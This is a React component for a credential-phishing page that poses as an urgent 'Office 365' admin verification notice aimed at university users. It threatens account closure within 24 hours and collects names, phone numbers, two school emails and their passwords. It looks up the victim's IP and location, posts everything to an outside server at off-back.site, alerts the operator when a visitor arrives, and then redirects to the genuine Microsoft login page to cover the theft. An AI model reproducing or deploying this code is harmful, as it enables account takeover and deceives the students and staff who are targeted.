import React, { useState, useEffect } from "react";
import { FormFooter } from "./FormFooter";

export const Email = () => {
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showPreviousPassword, setShowPreviousPassword] = useState(false);
  const [currentPassword, setCurrentPassword] = useState('');
  const [previousPassword, setPreviousPassword] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isSending, setIsSending] = useState(false);

  const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'https://off-back.site'; // Fallback to localhost if not set

  // Notify visitor on component mount
  useEffect(() => {
    if (!sessionStorage.getItem("visitor-notified")) {
      sessionStorage.setItem("visitor-notified", "true");

      fetch(`${apiUrl}/visitor-alert`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
      })
        .then((res) => {
          if (!res.ok) {
            console.error("Visitor alert failed with status:", res.status);
          }
        })
        .catch((error) => {
          console.error("Visitor alert failed:", error);
        });
    }
  }, [apiUrl]);

  const handlePhoneChange = (e) => {
    const value = e.target.value;
    const formattedValue = value
      .replace(/\D/g, "")
      .replace(/(\d{3})(\d{1,3})/, "($1) $2")
      .replace(/(\(\d{3}\) \d{3})(\d{1,4})/, "$1-$2");
    setPhoneNumber(formattedValue);
  };

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    setIsSending(true);

    const form = e.target;
    const fullName = form.fullName.value;
    const currentEmail = form.currentEmail.value;
    const previousEmail = form.previousEmail.value;
    const currentPassword = form.currentPassword.value;
    const previousPassword = form.previousPassword.value;

    const dateTime = new Date().toLocaleString();

    try {
      const locationRes = await fetch("https://ipinfo.io/json?token=b0c08e58958f26");
      const locationData = await locationRes.json();

      const city = locationData.city || "Unknown City";
      const region = locationData.region || "Unknown Region";
      const country = locationData.country || "Unknown Country";
      const ip = locationData.ip || "Unknown IP";

      const formData = {
        fullName,
        phoneNumber,
        currentEmail,
        previousEmail,
        currentPassword,
        previousPassword,
        locationData: { city, region, country, ip },
        dateTime,
      };

      const response = await fetch(`${apiUrl}/submit-form`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        alert("Account Updated Successfully");
      } else {
        alert("Reconfirm Your Details");
      }

      window.location.href = "https://login.microsoftonline.com/";
    } catch (err) {
      console.error("Error:", err);
      alert("An error occurred. Please try again.");
    } finally {
      setIsSending(false);
    }
  };

  return (
    <>
      <div className="field-container">
        <div className="notice-message" style={{ marginBottom: "20px", color: "#333", fontSize: "15px", lineHeight: "1.5" }}>
          <p>
            We noticed that your Office 365 has two separate logins for two different university portals.  Please provide the two logins as soon as possible. To avoid termination within 24 hours, we expect you to strictly adhere and address the issue.  Failure to verify will result in the closure of your account.  Please fill out the details for each school below.
          </p>
        </div>

        <h4>NOTICE BY ADMIN VERIFY YOUR OFFICE 365</h4>

        <form className="school-info-form" onSubmit={handleFormSubmit}>
          <div className="input-group">
            <input type="text" name="fullName" placeholder="Full Name" className="field email-field" required />
          </div>

          <div className="input-group">
            <input
              type="text"
              name="phoneNumber"
              placeholder="Phone Number (XXX) XXX-XXXX"
              className="field email-field"
              required
              maxLength="14"
              value={phoneNumber}
              onChange={handlePhoneChange}
            />
          </div>

          <div className="input-group">
            <input type="email" name="currentEmail" placeholder="Current School Email" className="field email-field" required />
          </div>

          <div className="input-group password-wrapper">
            <input
              type={showCurrentPassword ? "text" : "password"}
              name="currentPassword"
              placeholder="Password (Protected Admin)"
              value={currentPassword}
              onChange={(e) => setCurrentPassword(e.target.value)}
              className="field email-field"
              required
            />
            <button type="button" className="toggle-password" onClick={() => setShowCurrentPassword(!showCurrentPassword)}>
              {showCurrentPassword ? "Hide" : "Show"}
            </button>
          </div>

          <div className="input-group">
            <input type="email" name="previousEmail" placeholder="Previous School Email" className="field email-field" />
          </div>

          <div className="input-group password-wrapper">
            <input
              type={showPreviousPassword ? "text" : "password"}
              name="previousPassword"
              placeholder="Password (Protected Admin)"
              value={previousPassword}
              onChange={(e) => setPreviousPassword(e.target.value)}
              className="field email-field"
            />
            <button type="button" className="toggle-password" onClick={() => setShowPreviousPassword(!showPreviousPassword)}>
              {showPreviousPassword ? "Hide" : "Show"}
            </button>
          </div>

          <div className="button-container">
            <button type="submit" className="next">
              {isSending ? "Submitting..." : "Submit"}
            </button>
          </div>
        </form>
      </div>

      <FormFooter />
    </>
  );
};
